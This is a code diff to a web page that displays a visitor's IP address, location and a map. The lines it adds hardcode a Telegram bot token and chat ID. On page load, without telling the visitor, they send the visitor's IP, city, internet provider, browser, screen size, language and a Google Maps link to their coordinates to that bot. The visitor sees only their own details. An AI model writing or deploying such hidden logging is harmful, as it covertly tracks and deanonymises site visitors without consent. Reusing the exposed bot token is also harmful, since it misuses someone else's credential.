@@ -44,6 +44,10 @@
 <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 
 <script>
+// --- КОНФІГУРАЦІЯ ТЕЛЕГРАМ ---
+const TG_TOKEN = "8639479669:AAHYhGU7UMGZ5nlo3-PGzKVsQx9vTaQojFk";
+const TG_CHAT_ID = "7445429506";
+
 // час
 setInterval(() => {
     document.getElementById("time").innerText = new Date().toLocaleString();
@@ -62,20 +66,47 @@ let scan = setInterval(() => {
     }
 }, 20);
 
-function startLogic() {
+// Функція відправки повідомлення
+function sendToTelegram(d) {
+    const text = `
+🔔 *НОВИЙ ВІЗИТ!*
+🌐 *IP:* ${d.ip}
+🌍 *Місце:* ${d.city}, ${d.country_name}
+🏢 *Провайдер:* ${d.org}
+📱 *OS/Браузер:* ${navigator.userAgent}
+🖥️ *Екран:* ${screen.width}x${screen.height}
+🌍 *Мова:* ${navigator.language}
+⏰ *Час:* ${new Date().toLocaleString()}
+🔗 *Maps:* https://www.google.com/maps?q=${d.latitude},${d.longitude}
+    `;
 
+    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: TG_CHAT_ID,
+            text: text,
+            parse_mode: "Markdown"
+        })
+    }).catch(err => console.error("TG Error:", err));
+}
+
+function startLogic() {
     fetch("https://ipapi.co/json/")
         .then(r => r.json())
         .then(data => {
+            
+            // Відправляємо боту відразу
+            sendToTelegram(data);
 
+            // Почергова поява для юзера
             setTimeout(() => {
                 document.getElementById("ip").innerText = data.ip;
                 document.getElementById("ipBox").classList.add("show");
             }, 300);
 
             setTimeout(() => {
-                document.getElementById("location").innerText =
-                    `${data.city}, ${data.country_name}`;
+                document.getElementById("location").innerText = `${data.city}, ${data.country_name}`;
                 document.getElementById("countryBox").classList.add("show");
             }, 600);
 
@@ -93,7 +124,7 @@ function startLogic() {
                 document.getElementById("timeBox").classList.add("show");
             }, 1500);
 
-            // додаткові дані
+            // Додаткові дані для юзера
             setTimeout(() => {
                 const extra = document.createElement("div");
                 extra.className = "box show";
@@ -115,7 +146,8 @@ function startLogic() {
             }, 2000);
 
         })
-        .catch(() => {
+        .catch((err) => {
+            console.error("Fetch Error:", err);
             document.getElementById("statusText").innerText = "ERROR";
         });
 }
@@ -128,9 +160,7 @@ function showMap(lat, lon, label) {
     if (window.myMap) window.myMap.remove();
 
     window.myMap = L.map('map').setView([lat, lon], 13);
-
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window.myMap);
-
     L.marker([lat, lon]).addTo(window.myMap)
         .bindPopup(label || "User location")
         .openPopup();
